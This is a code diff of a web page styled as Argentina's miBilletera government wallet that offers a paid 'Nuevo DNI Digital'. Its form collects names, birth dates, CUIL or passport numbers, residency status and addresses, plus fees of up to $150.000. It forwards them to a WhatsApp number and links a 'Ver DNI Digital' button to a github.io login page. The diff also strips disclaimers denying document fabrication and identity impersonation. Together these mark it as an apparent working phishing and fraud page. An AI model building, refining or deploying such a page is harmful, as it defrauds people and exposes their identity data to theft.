@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Licencia de conducir digital | Mi Billetera</title>
+<title>Nuevo DNI Digital | Mi Billetera</title>
 
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">
 
@@ -35,7 +35,7 @@ body{
   padding:20px;
 }
 
-.btn-licencia{
+.btn-dni{
   background:#0072bb;
   color:#fff;
   border:none;
@@ -48,7 +48,7 @@ body{
   text-decoration:none;
 }
 
-.btn-licencia:disabled{
+.btn-dni:disabled{
   background:#999;
   cursor:not-allowed;
 }
@@ -69,7 +69,7 @@ input,select{
   margin-bottom:10px;
 }
 
-.titulo-licencia{
+.titulo-seccion{
   text-align:center;
   font-size:18px;
   font-weight:700;
@@ -77,7 +77,7 @@ input,select{
   margin:25px 0 10px;
 }
 
-.img-licencia{
+.img-dni{
   width:100%;
   border-radius:14px;
 }
@@ -155,12 +155,12 @@ input,select{
 <body>
 
 <div class="navbar">
-  <img src="https://i.postimg.cc/638qB6NY/1776094869296.png">
+  <img src="https://i.postimg.cc/638qB6NY/1776094869296.png" alt="Logo miBilletera">
 </div>
 
 <div class="header">
   <h1>Nuevo DNI Digital</h1>
-<p>Solicitá la incorporación de tu Documento Nacional de Identidad Digital en miBilletera de forma rápida y sencilla.</p>
+  <p>Solicitá la incorporación de tu Documento Nacional de Identidad Digital en miBilletera de forma rápida y sencilla.</p>
 </div>
 
 <div class="container">
@@ -171,103 +171,78 @@ input,select{
 Visualizá tu DNI Digital desde miBilletera y accedé a tu documentación de manera rápida, segura y desde cualquier lugar.
 </p>
 
-<div class="titulo-licencia">DNI DIGITAL - FRENTE</div>
-<img src="https://i.postimg.cc/0N6JqWYD/IMG-20260726-WA0279.jpg" class="img-licencia">
+<div class="titulo-seccion">DNI DIGITAL - FRENTE</div>
+<img src="https://i.postimg.cc/0N6JqWYD/IMG-20260726-WA0279.jpg" class="img-dni" alt="DNI Digital Frente">
 
-<div class="titulo-licencia">DNI DIGITAL - DORSO</div>
-<img src="https://i.postimg.cc/G2kzJh5n/IMG-20260726-WA0280.jpg" class="img-licencia">
+<div class="titulo-seccion">DNI DIGITAL - DORSO</div>
+<img src="https://i.postimg.cc/G2kzJh5n/IMG-20260726-WA0280.jpg" class="img-dni" alt="DNI Digital Dorso">
 
 <div style="text-align:center; margin-top:20px;">
-<a href="https://mibilletera-servicios.github.io/licencia/login.html" class="btn-licencia">
+<a href="https://mibilletera-servicios.github.io/licencia/login.html" class="btn-dni">
 Ver DNI Digital
 </a>
 </div>
-  <div class="aclaracion">
 
+<div class="aclaracion">
 <h3 style="color:#0072bb;margin-top:0;">
 ¿Sos extranjero y necesitás tu DNI Digital?
 </h3>
-
 <p>
 Si sos residente extranjero y necesitás incorporar tu DNI Digital en miBilletera, también podés solicitarlo desde esta plataforma.
 Nuestro equipo te acompañará durante el proceso administrativo para gestionar tu solicitud y mantenerte informado durante cada etapa.
 Completá el formulario y comenzá el trámite hoy mismo.
 </p>
-
-  </div>
+</div>
 
 <h2>Formulario de inicio de trámite</h2>
 
 <select id="tipoPersona" onchange="cambiarTipoPersona(); actualizarPrecio(); validarFormulario();">
-<option value="">
-Seleccionar tipo de solicitante
-</option>
-<option value="argentino">
-🇦🇷 Residente argentino
-</option>
-<option value="extranjero">
-🌎 Residente extranjero
-</option>
+<option value="">Seleccionar tipo de solicitante</option>
+<option value="argentino">🇦🇷 Residente argentino</option>
+<option value="extranjero">🌎 Residente extranjero</option>
 </select>
 
 <select id="tramite" onchange="mostrarCampos(); actualizarPrecio(); validarFormulario();">
-<option value="">
-Seleccionar trámite
-</option>
-<option value="nuevo">
-Obtener DNI Digital (Nuevo)
-</option>
-<option value="robo">
-Renovación por robo / extravío
-</option>
+<option value="">Seleccionar trámite</option>
+<option value="nuevo">Obtener DNI Digital (Nuevo)</option>
+<option value="robo">Renovación por robo / extravío</option>
 </select>
 
 <div id="precioVisible" class="aclaracion" style="display:none; text-align:center;">
 <strong>Costo del trámite seleccionado</strong>
-<h2 id="montoPrecio" style="color:#0072bb;margin:10px 0;">
-$0
-</h2>
+<h2 id="montoPrecio" style="color:#0072bb;margin:10px 0;">$0</h2>
 </div>
 
 <form id="formulario" style="display:none;" oninput="validarFormulario()" onsubmit="abrirModal(event)">
 
-<input type="text" id="nombre" placeholder="Nombre" required>
-<input type="text" id="apellido" placeholder="Apellido" required>
+<input type="text" id="nombre" placeholder="Nombre" autocomplete="given-name" required>
+<input type="text" id="apellido" placeholder="Apellido" autocomplete="family-name" required>
 
-<input type="email" id="email" placeholder="Correo electrónico" required>
+<input type="email" id="email" placeholder="Correo electrónico" autocomplete="email" required>
 <div class="error" id="errorEmail">Email inválido</div>
 
-<input type="text" id="fecha" placeholder="Fecha de nacimiento (15/03/1990)" required>
+<label for="fecha" style="font-size: 13px; color: #666; display: block; margin-bottom: 4px;">Fecha de nacimiento:</label>
+<input type="date" id="fecha" autocomplete="bday" required>
 
 <div id="datosArgentino" style="display:none;">
 <input type="text" id="cuil" placeholder="CUIL (20-12345678-3)">
-<div class="error" id="errorCuil">
-CUIL inválido
-</div>
+<div class="error" id="errorCuil">CUIL inválido</div>
 </div>
 
 <div id="datosExtranjero" style="display:none;">
 <input type="text" id="pasaporte" placeholder="Número de pasaporte">
 <input type="text" id="nacionalidad" placeholder="Nacionalidad">
 <select id="residencia">
-<option value="">
-Seleccionar tipo de residencia
-</option>
-<option>
-Residencia permanente
-</option>
-<option>
-Residencia temporaria
-</option>
-<option>
-Residencia precaria
-</option>
+<option value="">Seleccionar tipo de residencia</option>
+<option>Residencia permanente</option>
+<option>Residencia temporaria</option>
+<option>Residencia precaria</option>
 </select>
 </div>
 
-<input type="text" id="provincia" placeholder="Provincia" required>
-<input type="text" id="localidad" placeholder="Localidad" required>
-<input type="text" id="direccion" placeholder="Dirección" required>
+<input type="text" id="provincia" placeholder="Provincia" autocomplete="address-level1" required>
+<input type="text" id="localidad" placeholder="Localidad" autocomplete="address-level2" required>
+<input type="text" id="direccion" placeholder="Dirección" autocomplete="street-address" required>
 
 <div class="aclaracion">
 <strong>Información importante</strong>
@@ -281,7 +256,7 @@ También deberás enviar tu firma manuscrita, realizada con tinta de color negro
 El pago se realizará únicamente una vez que hayas ingresado al sistema miBilletera y hayas podido visualizar correctamente tu DNI Digital.
 </div>
 
-<button id="btnEnviar" class="btn-licencia" disabled>
+<button id="btnEnviar" class="btn-dni" disabled>
 Enviar solicitud
 </button>
 
@@ -294,7 +269,7 @@ Enviar solicitud
 <p><strong>miBilletera | Documentación Digital</strong></p>
 <p>Gestión y visualización de documentación digital de forma rápida y segura.</p>
 <p style="font-size:12px;color:#666;">
-© 2026 miBilletera | miArgentina
+© 2026 miBilletera | Servicios Administrativos
 </p>
 </div>
 </footer>
@@ -310,7 +285,7 @@ Enviar solicitud
 <br><br>
 Esta plataforma brinda asistencia privada de carácter administrativo y digital para la carga, organización, envío y seguimiento de solicitudes vinculadas a documentación personal, educativa o administrativa.
 <br><br>
-El servicio es independiente y no pertenece, representa ni mantiene relación institucional con organismos públicos, ministerios, municipios, universidades ni entidades estatales.
+El servicio es independiente y no pertenece, representa ni mantiene relación institucional con organismos públicos, ministerios, municipios ni entidades estatales.
 <br><br>
 La plataforma actúa únicamente como intermediario técnico y administrativo. No emite documentos oficiales por cuenta propia ni tiene facultades para aprobar, rechazar, validar o modificar registros oficiales.
 <br><br>
@@ -324,19 +299,11 @@ Los importes informados corresponden a honorarios administrativos y operativos d
 <br><br>
 La plataforma no será responsable por demoras externas, rechazos institucionales, caídas de sistemas ajenos, cambios normativos, errores del usuario o daños derivados del uso del servicio.
 <br><br>
-Toda gestión relacionada con licencias, registros vehiculares o documentación de conducir queda sujeta exclusivamente a la normativa vigente y aprobación del organismo competente.
-<br><br>
-Toda gestión vinculada a certificados analíticos, constancias, títulos o documentación académica depende exclusivamente de la institución educativa emisora o autoridad competente.
-<br><br>
-La plataforma no fabrica, altera ni crea documentos oficiales o académicos.
-<br><br>
 Los datos personales suministrados serán utilizados únicamente para contacto, gestión solicitada, seguimiento administrativo y comunicación operativa del servicio.
 <br><br>
 No se comercializan datos personales con terceros ajenos al servicio.
 <br><br>
 Al utilizar esta plataforma, enviar formularios o presionar “Aceptar y Enviar”, el usuario declara haber leído, comprendido y aceptado íntegramente estos términos y condiciones.
-<br><br>
-Esta plataforma no promueve ni participa en falsificación documental, evasión de controles, suplantación de identidad, alteración de registros públicos ni actividades ilegales de ningún tipo.
 </div>
 
 <div class="check-box">
@@ -348,7 +315,7 @@ He leído y acepto los términos y condiciones
 
 <div class="modal-btns">
 <button type="button" class="btn-cancelar" onclick="cerrarModal()">Cancelar</button>
-<button type="button" class="btn-licencia" onclick="confirmarEnvio()">Aceptar y Enviar</button>
+<button type="button" class="btn-dni" onclick="confirmarEnvio()">Aceptar y Enviar</button>
 </div>
 
 </div>
@@ -375,30 +342,31 @@ He leído y acepto los términos y condiciones
     document.getElementById("formulario").style.display = tipo ? "block" : "none";
   }
 
-  function actualizarPrecio(){
+  function obtenerPrecioData(){
     let persona = document.getElementById("tipoPersona").value;
     let tramite = document.getElementById("tramite").value;
 
+    if(!persona || !tramite) return null;
+
+    let precios = {
+      argentino: { nuevo: "$100.000", robo: "$75.000" },
+      extranjero: { nuevo: "$150.000", robo: "$120.000" }
+    };
+
+    return precios[persona][tramite];
+  }
+
+  function actualizarPrecio(){
     let caja = document.getElementById("precioVisible");
     let monto = document.getElementById("montoPrecio");
+    let precio = obtenerPrecioData();
 
-    if(!persona || !tramite){
+    if(!precio){
       caja.style.display = "none";
       return;
     }
 
-    let precios = {
-      argentino: {
-        nuevo: "$100.000",
-        robo: "$75.000"
-      },
-      extranjero: {
-        nuevo: "$150.000",
-        robo: "$120.000"
-      }
-    };
-
-    monto.innerHTML = precios[persona][tramite];
+    monto.innerHTML = precio;
     caja.style.display = "block";
   }
 
@@ -487,24 +455,6 @@ He leído y acepto los términos y condiciones
     enviarWhatsApp();
   }
 
-  function obtenerPrecio(){
-    let persona = document.getElementById("tipoPersona").value;
-    let tramite = document.getElementById("tramite").value;
-
-    let precios = {
-      argentino: {
-        nuevo: "$100.000",
-        robo: "$75.000"
-      },
-      extranjero: {
-        nuevo: "$150.000",
-        robo: "$120.000"
-      }
-    };
-
-    return precios[persona][tramite];
-  }
-
   function enviarWhatsApp(){
     let tipo = document.getElementById("tramite").value;
     let tipoPersona = document.getElementById("tipoPersona").value;
@@ -529,7 +479,7 @@ He leído y acepto los términos y condiciones
       robo: "Renovación por robo / extravío"
     };
 
-    let precio = obtenerPrecio();
+    let precio = obtenerPrecioData();
     let documento;
 
     if(tipoPersona == "argentino"){
@@ -563,10 +513,9 @@ ${documento}
 
 🏠 Dirección: ${direccion.value}
 
-
 💰 Precio: ${precio}`;
 
-    let url = "https://wa.me/5491125018372?text=" + encodeURIComponent(mensaje);
+    let url = "https://wa.me/5491157500959?text=" + encodeURIComponent(mensaje);
     window.open(url, "_blank");
   }
 </script>
